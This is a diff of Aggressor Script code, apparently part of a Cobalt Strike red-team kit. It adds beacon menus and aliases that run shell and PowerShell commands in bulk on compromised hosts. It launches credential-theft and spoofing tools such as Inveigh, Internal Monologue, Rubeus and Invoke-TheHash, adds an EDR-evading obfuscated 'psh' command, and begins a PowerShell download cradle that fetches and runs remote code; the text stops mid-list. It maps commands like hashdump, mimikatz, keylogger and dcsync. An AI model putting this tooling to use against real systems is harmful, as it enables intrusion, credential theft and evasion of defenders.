+    @job = split(' - ', %jobs["job"]);
+    $jid = @job[0];
+    $pid = @job[1];
+    $desc = @job[2];
+
+    arsenal::debug("Killed Job on Beacon ( $+ $bid $+ ): jid= $+ $jid $+ ; pid= $+ $pid $+ ; desc=(\" $+ $desc \")");
+
+    bjobkill($bid, $jid);
+    remove(%OPERATING_BEACONS[$bid]['jobs'], %jobs["job"]);
+    saveBeaconsMetadataCache();
+
+    #show_message("Job killed:\n  " . %jobs["job"]);
+}
+
+sub arsenal::killJobDialog {
+    local('$bid $dialog %jobs $n');
+    $bid = $1[0];
+    %jobs = %();
+    %jobs["bid"] = $bid;
+    %jobs["job"] = %OPERATING_BEACONS[$bid]['jobs'];
+
+    if(size(%jobs["job"]) == 0) {
+        prompt_confirm("We don't know about this Beacon's jobs at the moment.\nType 'jobs' in Beacon's console and wait for the output. Then get back to this dialog.\n\nDo you want to issue 'jobs' in the selected Beacon now?", "No jobs for this Beacon", lambda({
+                bjobs($bid);
+            }, $bid => $bid));
+        return;
+    }
+
+    $n = binfo($bid, "user") . ": " . binfo($bid, "internal") . "@" . binfo($bid, 'pid');
+
+    $dialog = dialog("Select Job to Kill in Beacon", %jobs, &arsenal::killJob);
+    dialog_description($dialog, "This dialog let's you choose which job to kill on Beacon ( $+ $n $+ ) - that we know it has " . size(%jobs["job"]) . "jobs running. The below list contains only cached list of jobs extracted from last 'jobs' command output typed in that Beacon's console. If there is no job you've just scheduled or you think this list is not up-to-date: issue 'jobs' command, wait for Beacon to respond and then get back to this dialog.\n\nSelect a one to have it killed.");
+    drow_combobox($dialog, "job", "Job to kill: ", %OPERATING_BEACONS[$bid]['jobs']);
+
+    dbutton_action($dialog, "Kill it");
+    dialog_show($dialog);
+}
+
+
+sub arsenal::getnote {
+    local('$b');
+    $b = $1;
+
+    #return binfo($b, 'note');
+
+    if($1 in keys(%OPERATING_BEACONS)) { 
+        if("notes" in keys(%OPERATING_BEACONS[$1])) {
+            return %OPERATING_BEACONS[$1]["notes"];
+        }
+    }
+
+    return "";
+}
+
+
+popup beacon_bottom {
+    menu "Arsenal..." {
+        item "Job Kill" {
+            arsenal::killJobDialog($1);
+        }
+
+        menu "&Mass Run..." {
+            item "Checkin" {
+                local('$b');
+                foreach $b ($1) {
+                    binput($b, "checkin");
+                    bcheckin($b);
+                }
+            }
+
+            item "Jobs" {
+                local('$b');
+                foreach $b ($1) {
+                    binput($b, "jobs");
+                    bjobs($b);
+                }
+            }
+
+            item "Getuid" {
+                local('$b');
+                foreach $b ($1) {
+                    binput($b, "getuid");
+                    bgetuid($b);
+                }
+            }
+
+            separator();
+
+            item "Custom command..." {
+                prompt_text("Cobalt Strike command to issue:", "", lambda({
+                    foreach $bid (@ids) {
+                        beacon_task($bid, $1);
+                    }
+                }, @ids => $1));
+            }
+
+            separator();
+
+            item "Shell..." {
+                prompt_text("Command to run in shell:", "whoami /groups", lambda({
+                    binput(@ids, "shell $1");
+                    bshell(@ids, $1);
+                }, @ids => $1));
+            }
+
+            item "Powershell..." {
+                prompt_text("Command to run in powershell:", "whoami /groups", lambda({
+                    binput(@ids, "powershell $1");
+                    bpowershell!(@ids, $1);
+                }, @ids => $1));
+            }
+
+            item "Powerpick..." {
+                prompt_text("Command to run in powerpick:", "whoami /groups", lambda({
+                    binput(@ids, "powerpick $1");
+                    bpowerpick!(@ids, $1);
+                }, @ids => $1));
+            }
+        }
+
+        menu "&Launch..." {
+            item "launch-powerup" {
+                binput($1, "launch-powerup");
+                foreach $bid ($1) {
+                    fireAlias($1, "launch-powerup", "");
+                }
+            }
+
+            item "launch-inveigh" {
+                binput($1, "launch-inveigh");
+                prompt_text("How long would you like to run Inveigh (in minutes)?", "10") {
+                    foreach $bid ($1) {
+                        fireAlias($bid, "launch-inveigh", "$1");
+                    }
+                }
+            }
+            
+            item "launch-sharpup" {
+                binput($1, "launch-sharpup");
+                foreach $bid ($1) {
+                    fireAlias($bid, "launch-sharpup", "");
+                }
+            }
+
+            item "launch-watson" {
+                binput($1, "launch-watson");
+                foreach $bid ($1) {
+                    fireAlias($1, "launch-watson", "");
+                }
+            }
+            
+            item "launch-sharphound" {
+                binput($1, "launch-sharphound");
+                foreach $bid ($1) {
+                    fireAlias($1, "launch-sharphound", "");
+                }
+            }
+            
+            item "launch-monologue" {
+                binput($1, "launch-monologue");
+                foreach $bid ($1) {
+                    fireAlias($1, "launch-monologue", "");
+                }
+            }
+
+            item "launch-sharpshares" {
+                binput($1, "launch-sharpshares");
+                foreach $bid ($1) {
+                    fireAlias($1, "launch-sharpshares", "");
+                }
+            }
+        }
+
+        menu "&Powershell Import..." {
+            item "import-powerup" {
+                binput($1, "import-powerup");
+                foreach $bid ($1) {
+                    fireAlias($1, "import-powerup", "");
+                }
+            }
+            
+            item "import-powerview" {
+                binput($1, "import-powerview");
+                foreach $bid ($1) {
+                    fireAlias($1, "import-powerview", "");
+                }
+            }
+            
+            item "import-powerupsql" {
+                binput($1, "import-powerupsql");
+                foreach $bid ($1) {
+                    fireAlias($1, "import-powerupsql", "");
+                }
+            }
+
+            item "import-mailsniper" {
+                binput($1, "import-mailsniper");
+                foreach $bid ($1) {
+                    fireAlias($1, "import-mailsniper", "");
+                }
+            }
+            
+            item "import-thehash" {
+                binput($1, "import-thehash");
+                foreach $bid ($1) {
+                    fireAlias($1, "import-thehash", "");
+                }
+            }
+        }
+
+        separator();
+
+        item "&Cancel all downloads" {
+            bcancel($1, "*");
+        }
+
+        item "&Set Arsenal note" {
+            foreach $bid ($1) {
+                prompt_text("Set this Beacon with Arsenal's note:", arsenal::getnote($bid), lambda({
+                    arsenal::note($bid, $1);
+                }, $bid => $bid));
+            }
+        }
+    }
+}
+
+set PSEXEC_SERVICE {
+    local('@foo');
+    @foo = split(',', %arsenal::defaults["psexec_service_name"]);
+    return @foo[rand(size(@foo))];
+}
+
+
+#
+# =============================================================================
+# BEACON NEW COMMANDS REGISTRATION
+#
+
+beacon_command_register(
+    "execute-assembly",
+    "Eexecute a local .NET program in-memory on target (tries to locate assembly if not found)",
+    "Use: execute-assembly </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly on target. This command loads the CLR in a temporary
+process and loads the assembly into it. If the specified assembly's name is not found, \nwill try to look for it in a preconfigured directory, in a similar fashion $PATH variable works.");
+
+beacon_command_register(
+    "import-powerview",
+    "Loads PowerView.ps1 using powershell-import (dev)",
+    "Use: import-powerview\n\nDescription: Simply imports locally stored PowerView_dev.ps1 script into beacon's runspace.");
+
+beacon_command_register(
+    "import-mailsniper",
+    "Loads MailSniper.ps1 using powershell-import",
+    "Use: import-mailsniper\n\nDescription: Simply imports locally stored MailSniper.ps1 script into beacon's runspace.");
+
+beacon_command_register(
+    "import-powerupsql",
+    "Loads PowerUpSQL.ps1 using powershell-import",
+    "Use: import-powerupsql\n\nDescription: Simply imports locally stored PowerUpSQL.ps1 script into beacon's runspace.");
+
+beacon_command_register(
+    "import-powerup",
+    "Loads PowerUp.ps1 using powershell-import",
+    "Use: import-powerup\n\nDescription: Simply imports locally stored PowerUp.ps1 script into beacon's runspace.");
+
+beacon_command_register(
+    "import-thehash",
+    "Loads Invoke-TheHash.ps1 using powershell-import",
+    "Use: import-thehash\n\nDescription: Simply imports locally stored Invoke-TheHash.ps1 script into beacon's runspace.");
+
+beacon_command_register(
+    "stracciatella-activedirectory",
+    "Pre-Loads ActiveDirectory Powershell module and executes specified command in Stracciatella.",
+    "Use: stracciatella-activedirectory <command>\n\nDescription: Assuming there is a Stracciatella.cna script loaded, this alias will pre-load Stracciatella with Import-Module ActiveDirectory\nand then execute given Powershell commands using Stracciatella.");
+
+beacon_command_register(
+    "launch-powerup",
+    "Loads PowerUp.ps1 using powershell-import and then issues Invoke-AllChecks",
+    "Use: launch-powerup\n\nDescription: Simply imports locally stored PowerUp.ps1 script into beacon's runspace and then\ntasks beacon to execute Invoke-AllChecks.");
+
+beacon_command_register(
+    "launch-inveigh",
+    "Launches InveighZero with specified (or default) options.",
+    "Use: launch-inveigh [[minutes] [options]]\n\nDescription: Launches InveighZero for specified amount of minutes with Eleveated or Unprivileged mode depending on Beacon's type and preset options (or custom ones).\n\nIf you wish to redirect spoofed packets to another machine, use -SpooferIP <IP> Inveigh option");
+
+beacon_command_register(
+    "launch-sharpup",
+    "Launches SharpUp assembly with options specified.",
+    "Use: launch-sharpup [options]\n\nDescription: Launches SharpUp with options given to this command.");
+
+beacon_command_register(
+    "launch-sharpdpapi",
+    "Launches SharpDPAPI assembly with options specified.",
+    "Use: launch-sharpup [options]\n\nDescription: Launches SharpDPAPI with options given to this command.");
+
+beacon_command_register(
+    "launch-monologue",
+    "Launches InternalMonologue attack by Elad Shamir to retrieve NetNTLMv2 hashes while unprivileged.",
+    "Use: launch-monologue\n\nDescription: Launches InternalMonologue attack by Elad Shamir to retrieve NetNTLMv2 hashes while unprivileged.");
+
+beacon_command_register(
+    "launch-sharpshares",
+    "Launches SharpShares scanner (by Mitch Moser) that will look for accessible SMB shares within entire Domain.",
+    "Use: launch-sharpshares [options]\n\nDescription: Launches SharpShares scanner (by Mitch Moser) that will look for accessible SMB shares within entire Domain.");
+
+beacon_command_register(
+    "launch-sharpwmi",
+    "Launches modified SharpWMI (able to retrieve WMI command output) assembly with options specified.",
+    "Use: launch-sharpwmi [sharpwmi-options]\n\nDescription: Launches modified SharpWMI (able to retrieve WMI command output) with options given to this command.");
+
+beacon_command_register(
+    "launch-watson",
+    "Launches Watson assembly with options specified.",
+    "Use: launch-watson [watson-options]\n\nDescription: Launches Watson with options given to this command.");
+
+beacon_command_register(
+    "launch-seatbelt",
+    "Launches SeatBelt assembly with options specified (or '-group=system' if none were given).",
+    "Use: launch-seatbelt [seatbelt-options]\n\nDescription: Launches SeatBelt with options given to this command. If none options were given - will launch with 'all'");
+
+beacon_command_register(
+    "launch-rubeus",
+    "Launches Rubeus assembly with options specified (or 'triage' if none were given).",
+    "Use: launch-rubeus [rubeus-options]\n\nDescription: Launches Rubeus with options given to this command. If none options were given - will launch with 'triage'");
+
+beacon_command_register(
+    "launch-sharphound",
+    "Launches SharpHound assembly with options specified (or '-c All' if none were given).",
+    "Use: launch-sharphound [sharphound-options]\n\nDescription: Launches SharpHound ingestor with options given to this command. If none options were given - will launch with '-c All'");
+
+beacon_command_register(
+    "psh",
+    "An alternative for `powershell` command using `base64(xor(command))` to STDIN strategy (avoids -Encodedcommand)",
+    "Use: psh [command]]\n\nDescription: Runs powershell obfuscated base64(xor(command)) piped to another powershell's command STDIN. In this way we avoid default Cobalt Strike's implementation using '-Encodedcommand' startup parameter that could be picked up by EDRs (such as FireEye HX). The base64 function was obfuscated away for your convenience.");
+
+beacon_command_register(
+    "whoami",
+    "Alias for 'run whoami'",
+    "Use: whoami [options]\n\nDescription: Runs 'whoami' with given parameters.");
+
+beacon_command_register(
+    "powershell-clear",
+    "Clear the imported PowerShell script from a Beacon session.",
+    "Clear the imported PowerShell script from a Beacon session.");
+
+beacon_command_register(
+    "ipconfig",
+    "Task a Beacon to list network interfaces",
+    "Task a Beacon to list network interfaces");
+
+beacon_command_register(
+    "cd",
+    "Change directory on host. Use '-' to get back to previous cwd.",
+    "Use: cd [directory]\n\nChange directory on host. Use '-' to get back to previous cwd.");
+
+beacon_command_register(
+    "getdomain",
+    "Return Beacon joined domain name.",
+    "Use: getdomain\n\nReturns domain FQDN domain name to which current machine is joined.");
+
+beacon_command_register(
+    "rm",
+    "Remove file or folders.",
+    "Use: rm file/folder1 [file/folder2 ...]\n\nRemoves a file or folder");
+
+beacon_command_register(
+    "getpid",
+    "Gets PID of a process.",
+    "Use: getpid [processname]\n\nReturns PIDs of all processes that matched the name.");
+
+beacon_command_register(
+    "powershell-clear",
+    "Clear the imported PowerShell script from a Beacon session.",
+    "Clear the imported PowerShell script from a Beacon session.");
+
+beacon_command_register(
+    "syncall",
+    "Syncs all downloaded files into local filesystem.",
+    "Syncs all downloaded files into a local path specified in mgeeky Arsenal's options. Already existing files are treated according to global settings.");
+
+beacon_command_register(
+    "upload",
+    "Upload a file to specified remote location.",
+    "Use: upload </local/path/to/file> [/remote/path/to/file]\n\nUpload a file from local path (first argument) to remote path (second argument, optional). Prints MD5 IOC of uploaded file.");
+
+beacon_command_register(
+    "autoppid",
+    "Automatically finds suitable PPID and sets it (target: low-priv: " . %arsenal::defaults["parent_process_name"] . ", priv: " . %arsenal::defaults["privileged_parent_process_name"] . " )",
+    "Use: autoppid [quiet]\n\nAutomatically finds suitable - according to the current user context - PPID and sets it (target: " . %arsenal::defaults["parent_process_name"] . " ). Add 'quiet' to supress extra information.");
+
+beacon_command_register(
+    "home",
+    "Change current directory to the user's home directory",
+    "Change current directory to the user's home directory");
+
+beacon_command_register(
+    "kerberos-purge",
+    "Purges in-memory Kebreros tickets completely using a few methods",
+    "Purges in-memory Kerberos TGT/TGS tickets using:\n\trev2self,\n\tkerberos_ticket_purge,\n\tklist purge,\n\tmimikatz kerberos::purge\n\trubeus.exe purge");
+
+
+#
+# ==============================================================================
+# START OF ALIASES
+#
+
+alias import-powerview {
+    arsenal::importPowershell($1, $POWERVIEW_PATH);
+}
+
+alias import-powerupsql {
+    arsenal::importPowershell($1, $POWERUPSQL_PATH);
+}
+
+alias import-powerup {
+    arsenal::importPowershell($1, $POWERUP_PATH);
+}
+
+alias import-mailsniper {
+    arsenal::importPowershell($1, $MAILSNIPER_PATH);
+}
+
+alias import-thehash {
+    arsenal::importPowershell($1, $INVOKE_THEHASH_PATH);
+}
+
+#
+# ---
+#
+
+alias kerberos-purge {
+    brev2self($1);
+    bkerberos_ticket_purge($1);
+    brun($1, "klist purge");
+    fireAlias($1, "launch-rubeus", "purge");
+}
+
+alias whoami {
+    local('$params');
+    $params = "/user /fo list";
+
+    if(strlen($0) > strlen("whoami ")) {
+        $params = substr($0, strlen("whoami "));
+    }
+
+    brun($1, "whoami $params");
+}
+
+alias powershell-clear {
+    bpowershell_import_clear($1);
+}
+
+alias ipconfig {
+    bipconfig($1, {
+        blog($1, "Network information is:\n $+ $2");
+    });
+}
+
+alias home {
+    local('$home');
+    $home = "c:\\users\\" . binfo($1, "user");
+    bcd($1, $home);
+}
+
+alias getdomain {
+    arsenal::runPowershell!($1, $POWERSHELL_GET_JOINED_DOMAIN_NAME);
+}
+
+#
+# getpid implementation by: Alyssa (ramen0x3f)
+# as presented in his utils.cna
+#
+sub getpidWorker {
+    $to_match = replace($3, ".exe", "");
+    bps($1, lambda({
+        local('$pid $name $entry $arch $user');
+        foreach $entry (split("\n", $2)) {
+            ($name, $null, $pid, $arch, $user) = split("\\s+", $entry);
+
+            if($user eq "NT") {
+                $user = substr($entry, indexOf($entry, "NT "));
+                $tab = indexOf($user, "\t");
+                if ($tab) {
+                    $user = substr($user, 0, $tab);
+                }
+            }
+
+            if ((lc(replace($name, ".exe", "")) cmp lc($to_match)) == 0) {
+                [$callback: $1, $name, $pid, $arch, $user];
+            }
+        }
+    }, $callback => $2));
+}
+
+alias getpid {
+    getpidWorker($1, {   
+        blog($1, "     $2 \t $3 \t $4 \t $5");
+    }, $2); 
+}
+
+
+sub extractBeaconCommandArgs {
+    local('$text $pos1 $pos2 @args $tmp');
+    @args = @();
+    $text = [$1 trim];
+
+    $pos1 = 0;
+    while($pos1 < strlen($text)) {
+        if(charAt($text, $pos1) eq '"') {
+            if((($pos1 > 1) && (charAt($text, $pos1 - 1)) ne '\\') || $pos1 == 0) {
+                for($pos2 = $pos1 + 1; $pos2 < strlen($text); $pos2++) {
+                    if(charAt($text, $pos2) eq '"') {
+                        if(($pos2 > 1) && (charAt($text, $pos2 - 1) ne '\\')) {
+                            if ((($pos2) - ($pos1 + 1)) > 0) {
+                                $tmp = [substr($text, $pos1 + 1, $pos2) trim];
+                                $tmp = replace($tmp, "\\\\\"", '"');
+                                push(@args, $tmp);
+                            }
+                            else {
+                                push(@args, "");
+                            }
+                            $pos1 = $pos2;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        else if (charAt($text, $pos1) ne ' ') {
+            $pos2 = indexOf($text, " ", $pos1);
+            if($pos2 !is $null) {
+                push(@args, [substr($text, $pos1, $pos2) trim]);
+                $pos1 = $pos2;
+            }
+            else {
+                push(@args, [substr($text, $pos1) trim]);
+                break;
+            }
+        }
+
+        $pos1 += 1;
+    }
+
+    return @args;
+}
+
+sub parseBeaconCommand {
+    local('%functions_map $a $k $argc $vargs $v @out $cmdline');
+
+    $cmdline = $1;
+
+    # add only non-standard mappings, like argue => bargue_add
+    %functions_map = %(
+        "argue" => @("bargue_add", 3),
+        "blockdlls" => @("bblockdlls", 2),
+        "browserpivot" => @("bbrowserpivot", 3),
+        "browserpivot-stop" => @("bbrowserpivot_stop", 1),
+        "cancel" => @("bcancel", 2),
+        #"cd" => @("bcd", 2),
+        "checkin" => @("bcheckin", 1),
+        "clear" => @("bclear", 1),
+        "connect" => @("bconnect", 2),
+        "covertvpn" => @("bcovertvpn", 4),
+        "cp" => @("bcp", 3),
+        "dcsync" => @("bdcsync", 3),
+        "desktop" => @("bdesktop", 1),
+        "dllinject" => @("bdllinject", 3),
+        "dllload" => @("bdllload", 3),
+        "dllspawn" => @("bdllspawn", 6),
+        "download" => @("bdownload", 2),
+        "drives" => @("bdrives", 1),
+        "elevate" => @("belevate", 3),
+        "error" => @("berror", 2),
+        "execute" => @("bexecute", 2),
+        #"execute-assembly" => @("bexecute_assembly", 3), # I've got execute-assembly redefined.
+        "exit" => @("bexit", 1),
+        "getprivs" => @("bgetprivs", 1),
+        "getsystem" => @("bgetsystem", 1),
+        "getuid" => @("bgetuid", 1),
+        "hashdump" => @("bhashdump", 1),
+        "inject" => @("binject", 4),
+        "injectsh" => @("binjectsh", 4),
+        "inline-execute" => @("binline_execute", 3),
+        "input" => @("binput", 2),
+        "jobkill" => @("bjobkill", 2),
+        "jobs" => @("bjobs", 1),
+        "jump" => @("bjump", 4),
+        "kerberos_ccache_use" => @("bkerberos_ccache_use", 2),
+        "kerberos_ticket_purge" => @("bkerberos_ticket_purge", 1),
+        "kerberos_ticket_use" => @("bkerberos_ticket_use", 2),
+        "keylogger" => @("bkeylogger", 3),
+        "kill" => @("bkill", 2),
+        "link" => @("blink", 2),
+        "log" => @("blog", 2),
+        "log2" => @("blog2", 2),
+        "make_token" => @("bloginuser", 4),
+        "logonpasswords" => @("blogonpasswords", 2),
+        "ls" => @("bls", 2),
+        "mimikatz" => @("bmimikatz", 2),
+        "mimikatz-small" => @("bmimikatz_small", 2),
+        "mkdir" => @("bmkdir", 2),
+        "mode" => @("bmode", 2),
+        "mv" => @("bmv", 3),
+        "net" => @("bnet", 2),
+        "note" => @("bnote", 2),
+        "passthehash" => @("bpassthehash", 4),
+        "pause" => @("bpause", 2),
+        "portscan" => @("bportscan", 5),
+        "powerpick" => @("bpowerpick", 3),
+        "powershell" => @("bpowershell", 3),
+        "powershell-import" => @("bpowershell_import", 2),
+        #"powershell-clear" => @("bpowershell_import_clear", 1),
+        #"ppid" => @("bppid", 2),
+        "ps" => @("bps", 1),
+        "psexec" => @("bpsexec", 5),
+        "psinject" => @("bpsinject", 4),
+        "pwd" => @("bpwd", 1),
+        "reg query" => @("breg_query", 3),
+        "reg queryv" => @("breg_queryv", 4),
+        "remote-exec" => @("bremote_exec", 4),
+        "rev2self" => @("brev2self", 1),
+        #"rm" => @("brm", 2),
+        "rportfwd" => @("brportfwd", 4),
+        "rportfwd_local" => @("brportfwd_local", 4),
+        "rportfwd_stop" => @("brportfwd_stop", 2),
+        "run" => @("brun", 2),
+        "runas" => @("brunas", 5),
+        "runasadmin" => @("brunasadmin", 2),
+        "runu" => @("brunu", 3),
+        "screenshot" => @("bscreenshot", 1),
+        "screenwatch" => @("bscreenwatch", 1),
+        "setenv" => @("bsetenv", 3),
+        #"shell" => @("bshell", 2),
+        "shinject" => @("bshinject", 4),
+        "shspawn" => @("bshspawn", 3),
+        "sleep" => @("bsleep", 3),
+        "socks" => @("bsocks", 2),
+        "socks stop" => @("bsocks_stop", 1),
+        "spawn" => @("bspawn", 3),
+        "spawnas" => @("bspawnas", 5),
+        "spawnto" => @("bspawnto", 3),
+        "spawnu" => @("bspawnu", 3),
+        "spunnel" => @("bspunnel", 4),
+        "spunnel_local" => @("bspunnel_local", 4),
+        "ssh" => @("bssh", 5),
+        "ssh-key" => @("bssh_key", 5),
+        "steal_token" => @("bsteal_token", 2),
+        "sudo" => @("bsudo", 3),
+        "task" => @("btask", 3),
+        "timestomp" => @("btimestomp", 3),
+        "unlink" => @("bunlink", 3),
+        #"upload" => @("bupload", 2),
+
+        # Command was not found among built-in ones, probably user refers to user-defined alias.
+        "*" => @("fireAlias", 3),
+    );
+
+    foreach $k => $vargs (%functions_map) {
+        $k = replace($k, '"', '');
+        $v = replace($vargs[0], '"', '');
+        $argc = $vargs[1];
+        $a = [left($cmdline, strlen($k)) trim];
+
+        if ($a eq $k) {
+            if((strlen($cmdline) > strlen($k) + 1) && left($cmdline, strlen($k) + 1) ne $k . " ") {
+                continue;
+            }
+
+            @args = @();
+
+            if(strlen($cmdline) > (strlen($k) + 1)) {
+                @args = extractBeaconCommandArgs(substr($cmdline, strlen($k) + 1));
+            }
+
+            return @($k, $v, $argc, @args);
+        }
+    }
+
+    $n = indexOf($cmdline, ' ');
+    
+    if($n !is $null) {
+        $k = substr($cmdline, 0, $n);
+    }
+    else {
+        $k = $cmdline;
+    }
+
+    $v = 'fireAlias,' . $k;
+    @args = extractBeaconCommandArgs(substr($cmdline, strlen($k)));
+    $n = 3;
+
+    return @($k, $v, $argc, @args);
+}
+
+sub constructClosure {
+    local('$func $argc $closure @args @nargs @xargs $n $tmp $i');
+
+    # The dynamic closure construction idea & implementation parts were borrowed from
+    # https://github.com/dcsync/pycobalt/blob/master/aggressor/pycobalt.cna
+
+    $func = $1;
+    $argc = $2;
+    @args = $3;
+    @nargs = @();
+    $n = $argc;
+    if(left($func, strlen('fireAlias,')) eq "fireAlias,") {
+        $tmp = join(' ', @args);
+        $tmp = replace($tmp, "\\\\", '^.^.^');
+        $tmp = replace($tmp, '\^\.\^\.\^', "\\\\\\\\");
+        #$tmp = replace($tmp, '"', "\\\\\"");
+
+        $closure = 'fireAlias($1, "' . split(',', $func)[1] . '", ';
+        $closure .= "'" . $tmp . "')";
+
+        return $closure;
+    }
+
+    if ($n > size(@args)) {
+        $n = size(@args);
+    }
+
+    for($i = 0; $i < $n; $i++) {
+        push(@nargs, "'" . @args[$i] . "'");
+    }
+
+    if(size(@args) > size(@nargs)) {
+        $n = 0;
+        $tmp = @nargs[size(@nargs) - 1];
+        if(right($tmp, 1) eq "'") {
+            $tmp = substr($tmp, 0, strlen($tmp) - 1);
+            $n = 1;
+        }
+
+        $tmp .= ' ' . join(' ', sublist(@args, size(@nargs)));
+        @nargs[size(@nargs) - 1] = $tmp;
+
+        if ($n == 1) {
+            @nargs[size(@nargs) - 1] .= "'";
+        }
+    }
+
+    # Replacing backslashes in strings to double-backslashes
+    for($i = 0; $i < size(@nargs); $i++) {
+        @nargs[$i] = replace(@nargs[$i], "\\\\", '^.^.^');
+        @nargs[$i] = replace(@nargs[$i], '\^\.\^\.\^', "\\\\\\\\");
+        #@nargs[$i] = replace(@nargs[$i], '"', "\\\\\"");
+    }
+
+    $closure = '';
+    $closure .= $func . '($1, ';
+    $closure .= join(', ', @nargs);
+    $closure .= ')';
+
+    return $closure;
+}
+
+sub beacon_task {
+    local('$bid $func $cmdline $argc $closure $closure_text $cmd @args');
+
+    $bid = $1;
+    $cmdline = $2;
+
+    if(indexOf($cmdline, "'") !is $null) {
+        berror($1, "Warning: beacon_task argument contains apostrophe (') that will break dynamically constructed closure! The expected beacon command probably won't run.");
+    }
+
+    ($cmd, $func, $argc, @args) = parseBeaconCommand($cmdline);
+
+    arsenal::debug("beacon_task(' $+ $cmdline $+ '): parsed cmd=\" $+ $cmd $+ \", func=\" $+ $func $+ \", args = " . @args);
+
+    $closure_text = constructClosure($func, $argc - 1, @args);
+    arsenal::debug("Prepared closure for beacon_task:\n\t" . $closure_text);
+
+    try
+    {
+        $closure = compile_closure($closure_text);
+
+        if ($closure !is $null) {
+            binput($1, $cmd . " " . join(' ', @args));
+            invoke($closure, @($bid), $cmd);
+        }
+        else {
+            arsenal::debug("Could not compile closure (returned null).");
+        }
+    }
+    catch $message
+    {
+        berror($1, "Could not compile closure for beacon_task (look in Script Console for more details): $message");        
+    }
+}
+
+sub checkStracciatella {
+    if($stracciatellaAvailable == false) {
+        foreach $command (beacon_commands()) {
+            if('stracciatella*' iswm $command) {
+                $stracciatellaAvailable = true;
+                break;
+            }
+        }
+    }
+}
+
+sub arsenal::runPowershell {
+    if($stracciatellaAvailable) {
+        fireAlias($1, "stracciatella", $2);
+    } else {
+        bpowerpick!($1, $2);
+    }
+}
+
+sub arsenal::importPowershell {
+    checkStracciatella();
+    bpowershell_import!($1, $2);
+
+    arsenal::debug("Imported powershell script (stracciatella available? " . $stracciatellaAvailable . " ): $2");
+
+    if($stracciatellaAvailable) {
+        fireAlias($1, "stracciatella-import", "$2");
+    }
+}
+
+#
+# ---
+#
+
+alias stracciatella-activedirectory {
+	checkStracciatella();
+
+	if(! $stracciatellaAvailable) {
+		berror($1, "Stracciatella is not loaded. Cannot use this command. Make sure you loaded stracciatella.cna script.");
+		return;
+	}
+
+	$command = substr($0, strlen("stracciatella-activedirectory "));
+	$args = "\" $+ $LOAD_ADPSMODULE $+ \" $command";
+
+	arsenal::debug("stracciatella-activedirectory1: stracciatella-script $args");
+	fireAlias($1, "stracciatella-script", $args);
+}
+
+alias powershell-clear {
+    bpowershell_import_clear($1);
+}
+
+alias launch-powerup {
+    bpowershell_import!($1, $POWERUP_PATH);
+    if($stracciatellaAvailable) {
+        fireAlias($1, "stracciatella-import", $POWERUP_PATH);
+    }
+
+    arsenal::runPowershell($1, "Invoke-AllChecks -Verbose");
+}
+
+alias launch-inveigh { 
+    local('$params');
+    $elevated = "N";
+
+    if(-isadmin $1) {
+        $elevated = "Y";
+    }
+
+    $minutes = int($2);
+    $pos = strlen("launch-inveigh ");
+
+    if($minutes == 0) {
+        $minutes = 10;
+    }
+    else {
+        $pos = $pos + strlen($2) + 1;
+    }
+
+    $fileOutput = "-FileOutput N";
+
+    if($0 ismatch '.*FileOutput.*') { 
+        $fileOutput = "";
+    }
+
+    $ip = binfo($1, "internal");
+    $params = "-Elevated $elevated -NBNS Y -RunTime $minutes -FileOutput N -HTTP Y -Proxy Y -LLMNR Y -IP $ip -ConsoleStatus 2";
+
+    if(strlen($0) > strlen("launch-inveigh ")) {
+        $params = substr($0, $pos) . " -Elevated $elevated $fileOutput";
+    }
+
+    btask($1, "Tasked beacon to launch Inveigh for $minutes minutes with parameters: $params");
+    bexecute_assembly!($1, $INVEIGH_PATH, $params);
+}
+
+alias launch-sharpup {
+    local('$params');
+    $params = "";
+
+    if(strlen($0) > strlen("launch-sharpup ")) {
+        $params = substr($0, strlen("launch-sharpup "));
+    }
+
+    bexecute_assembly($1, $SHARPUP_PATH, $params);
+}
+
+alias launch-sharpdpapi {
+    local('$params');
+    $params = "";
+
+    if(strlen($0) > strlen("launch-sharpdpapi ")) {
+        $params = substr($0, strlen("launch-sharpdpapi "));
+    }
+
+    bexecute_assembly($1, $SHARPDPAPI_PATH, $params);
+}
+
+alias launch-sharpwmi {
+    local('$params');
+    $params = "";
+
+    if(strlen($0) > strlen("launch-sharpwmi ")) {
+        $params = substr($0, strlen("launch-sharpwmi "));
+    }
+
+    bexecute_assembly($1, $SHARPWMI_PATH, $params);
+}
+
+alias launch-watson {
+    local('$params');
+    $params = "";
+
+    if(strlen($0) > strlen("launch-watson ")) {
+        $params = substr($0, strlen("launch-watson "));
+    }
+
+    bexecute_assembly($1, $WATSON_PATH, $params);
+}
+
+alias launch-seatbelt {
+    local('$params');
+    $params = "-group=system";
+
+    if(strlen($0) > strlen("launch-seatbelt ")) {
+        $params = substr($0, strlen("launch-seatbelt "));
+    }
+
+    bexecute_assembly($1, $SEATBELT_PATH, $params);
+}
+
+alias launch-rubeus {
+    local('$params');
+    $params = "triage";
+
+    if(strlen($0) > strlen("launch-rubeus ")) {
+        $params = substr($0, strlen("launch-rubeus "));
+    }
+
+    $params .= " /nowrap";
+    bexecute_assembly($1, $RUBEUS_PATH, $params);
+}
+
+alias launch-sharphound {
+    local('$params');
+    $params = "-c All";
+
+    if(strlen($0) > strlen("launch-sharphound ")) {
+        $params = substr($0, strlen("launch-sharphound "));
+    }
+
+    bexecute_assembly($1, $SHARPHOUND_PATH, $params);
+}
+
+alias launch-monologue {
+    btask($1, "Tasked beacon to retrieve NetNTLMV2 hashes using Internal Monologue attack.");
+    bexecute_assembly($1, $INTRNL_MONOLG_PATH, "");
+}
+
+alias launch-sharpshares {
+    btask($1, "Tasked beacon to search for SMB shares with SharpShares-mitch.");
+
+    local('$params');
+    $params = "/ldap:all /filter:sysvol,netlogon,ipc$,print$";
+
+    if(strlen($0) > strlen("launch-sharpshares ")) {
+        $params = substr($0, strlen("launch-sharpshares "));
+    }
+
+    bexecute_assembly($1, $SHARPSHARES_PATH, $params);
+}
+
+
+#
+# ---
+#
+
+set POWERSHELL_DOWNLOAD_CRADLE {
+    local('$url $strategy $cradle @downloadPrimitives @executionPrimitives $download $execution $downloadPrimitive $executionPrimitive');
+    $url = $1;
+
+    # Each download primitive must download data from given ##URL## (that will be replaced later on)
+    # and put it into $u variable
+    @downloadPrimitives = @(
+        # Unsafe (Net.WebClient).DownloadString
+        "\$u=(New-Object Net.Webclient).DownloadString('##URL##')",
+
+        # PowerShell 3.0+: Invoke-RestMethod
+        "\$u=('##URL##'|%{(Invoke-RestMethod \$_)})",
+
+        # (Net.WebClient).DownloadString
